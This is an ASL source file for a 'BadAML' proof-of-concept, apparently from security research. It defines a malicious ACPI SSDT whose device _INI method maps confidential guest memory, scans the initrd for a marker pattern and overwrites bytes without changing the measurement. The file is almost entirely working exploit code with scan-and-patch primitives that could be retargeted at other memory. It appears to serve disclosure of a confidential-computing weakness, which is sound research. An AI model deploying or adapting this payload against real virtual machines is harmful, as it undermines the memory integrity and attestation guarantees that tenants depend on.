/*
    This is an BadAML attack payload that demonstrates AML access to confidential memory pages
    by writing to a file in the initrd, without changing the measurement.

    We do some simplifications in our setup to create a testbed for this attack (see badaml.nix):
    - Use an uncompressed initrd, so it can be modified directly and targeted.
    - Place a file with a known pattern (0xDEADBEEF repeated) in the initrd, so we can easily find it.
    - To check the attack result, copy that file to /run after the AML execution so it can be checked
      in the final system.

    To mount the attack, we use a shell wrapper around QEMU that adds the malicious table via -acpitable flag.

    The AML code does the following:
*/

// Define an SSDT table. This is one of the tables that can contain AML code.
DefinitionBlock ("", "SSDT", 6, "BADAML", "BADAML", 0x20240306)
{
    Scope (\_SB)
    {
        Device (FAKE)
        {
            Name (_HID, "MSFT0003")

            // Define an OperationRegion that maps to the initrd memory.
            // The start address of the initrd is template in, as it varies.
            // It can be obtained from dmesg output (look for "efi: INITRD=0x...").
            OperationRegion (INRD, SystemMemory, @INITRD_START@, 64)
            Field (INRD, AnyAcc, NoLock, Preserve)
            {
                ADDR,   64,
            }

            // Read 4 bytes at address Arg0
            Method (RD32, 1, Serialized)
            {
                OperationRegion (RCHK, SystemMemory, Arg0, 4)
                Field (RCHK, DWordAcc, NoLock, Preserve)
                {
                    DVAL, 32
                }
                Return (DVAL)
            }

            // Coarse scan: jump by Arg2 bytes looking for pattern Arg3.
            // Checks 4 byte offsets at each position to handle unaligned initrd.
            // Returns address if found, 0 if not found.
            Method (CSCA, 4, Serialized)
            {
                Local0 = Arg0           // Current address
                Local1 = Arg0 + Arg1    // End address

                While (Local0 < Local1)
                {
                    // Check 4 byte offsets (0, 1, 2, 3) to handle misalignment
                    Local2 = 0
                    While (Local2 < 4)
                    {
                        If (RD32(Local0 + Local2) == Arg3)
                        {
                            Return (Local0 + Local2)
                        }
                        Local2 += 1
                    }
                    Local0 += Arg2
                }

                Return (Zero)
            }

            // Fine scan backward from Arg0 to find start of pattern block.
            // Returns start address of contiguous pattern.
            Method (FSCN, 2, Serialized)
            {
                Local0 = Arg0

                While (One)
                {
                    Local1 = Local0 - 4
                    If (RD32(Local1) != Arg1)
                    {
                        Return (Local0)
                    }
                    Local0 = Local1
                }

                Return (Local0)
            }

            // Patch 4 bytes at Arg0 with value Arg1.
            // Returns original value.
            Method (PT32, 2, Serialized)
            {
                OperationRegion (TG32, SystemMemory, Arg0, 4)
                Field (TG32, DWordAcc, NoLock, Preserve)
                {
                    DWRD, 32
                }
                Local0 = DWRD
                DWRD = Arg1
                Return (Local0)
            }

            // The _INI method is automatically called on device initialization.
            Method (_INI, 0, Serialized)
            {
                Debug = "BADAML: _INI started"

                // Set local to the start address of initrd.
                // ADDR is 64-bit field and may be returned as Buffer, so we convert to Integer.
                Local0 = ToInteger(ADDR)
                Debug = "BADAML: initrd addr:"
                Debug = Local0

                // Read first 8 bytes to see what's actually there.
                // This is for debugging purpose only, showing for example the
                // zstd magic if the initrd is compressed.
                Debug = "BADAML: first dword at initrd:"
                Debug = RD32(Local0)

                // Initrd size (uncompressed). This is ~55MB in our case, but we
                // use ~200MB = 0xC800000 to be safe.
                Local1 = 0xC800000

                Debug = "BADAML: coarse scanning initrd for 0xdeadbeef"

                // Coarse scan: Find the target file.
                // Jump 32KB (0x8000) at a time.
                // The deadbeef file is 64KB, so we'll hit it.
                // Note: bytes DE AD BE EF read as little-endian DWORD = 0xEFBEADDE.
                Local2 = CSCA(Local0, Local1, 0x8000, 0xEFBEADDE)

                If (Local2 != Zero)
                {
                    Debug = "BADAML: coarse hit, finding start of block"

                    // Fine scan backward to find start of the target file.
                    Local3 = FSCN(Local2, 0xEFBEADDE)

                    Debug = "BADAML: pattern block found, overwriting with 0xcafebabe"
                    // Patch the first 4 bytes of the target file.
                    // Again, little-endian so we write 0xBEBAFECA.
                    PT32(Local3, 0xBEBAFECA)
                }
                Else
                {
                    Debug = "BADAML: 0xdeadbeef not found in initrd"
                }

                Debug = "BADAML: done"

                /* Padding */
                NoOp
            }
        }
    }
}
